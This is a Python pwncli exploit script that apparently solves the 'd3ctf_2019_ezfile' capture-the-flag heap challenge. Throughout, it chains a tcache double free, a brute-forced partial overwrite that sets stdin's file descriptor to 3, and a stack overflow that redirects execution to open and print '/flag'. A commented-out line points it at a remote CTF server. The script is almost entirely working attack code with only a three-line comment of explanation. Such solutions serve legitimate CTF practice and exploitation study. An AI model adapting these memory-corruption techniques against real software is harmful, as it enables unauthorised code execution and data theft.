#!/usr/bin/python3
from pwncli import *

cli_script()


def add(p, data="\x00"*0x10):
    p.sendlineafter(">>", "1")
    p.sendlineafter("size of your note >>", str(len(data)))
    p.sendafter("input your content >>", data)

def dele(p, idx):
    p.sendlineafter(">>", "2") 
    p.sendlineafter("input the index to delete >>", str(idx))

def enc(p, idx, data):
    p.sendlineafter(">>", "3")
    p.sendlineafter("input the index to encrypt >>", str(idx))
    p.sendlineafter("input the size of the seed (max 0x50) >>", str(len(data)))
    p.sendafter("input the crypt seed >>", data)


"""
1.爆破申请到stdin的fileno附近 修改为3
2. 利用栈溢出修改到0x1147，会执行open("/flag")，参数可控
3. scanf的时候会从3中读取内容，然后输出flag
"""
context.timeout = 3
@local_enumerate_attack(gift['filename'], loop_time=0x60)
#@remote_enumerate_attack(argv="./d3ctf_2019_ezfile", ip="node4.buuoj.cn", port=25291, loop_time=0x60)
def attack(p:tube, libc:ELF):
    p.sendlineafter("your name: ", "lynne")
    add(p)
    add(p)
    add(p)
    add(p)
    add(p)
    add(p)

    dele(p, 0)
    dele(p, 0)
    dele(p, 0)


    add(p, "\x60")
    add(p)
    add(p, flat(0, 0xa1))

    for _ in range(8):
        dele(p, 0)

    guess_addr = 0x2a70
    # if gift['debug']:
    #     libc_base_addr = get_current_libcbase_addr()
    #     guess_addr = (libc_base_addr + libc.sym['_IO_2_1_stdin_'] + 0x70) & 0xffff

    add(p, p16(guess_addr))

    dele(p, 2)
    dele(p, 2)
    dele(p, 2)
    dele(p, 2)

    add(p, "\x70")
    add(p)
    add(p)
    add(p, p8(3))

    guess_addr = 0x1147
    # if gift['debug']:
    #     code_base_addr = get_current_codebase_addr()
    #     guess_addr = 0xffff & (code_base_addr + 0x1147)

    enc(p, 20, flat({
        0:"/flag\x00",
        0x58: 0,
        0x68: p16(guess_addr)
    }))

    m = p.recvline_contains("flag{", timeout=4)
    if b"flag" in m:
        log2_ex_highlight(f"Get flag: {m}")
        raise PwncliExit()
    else:
        raise RuntimeError()
    p.interactive()

attack(gift['io'], gift['libc'])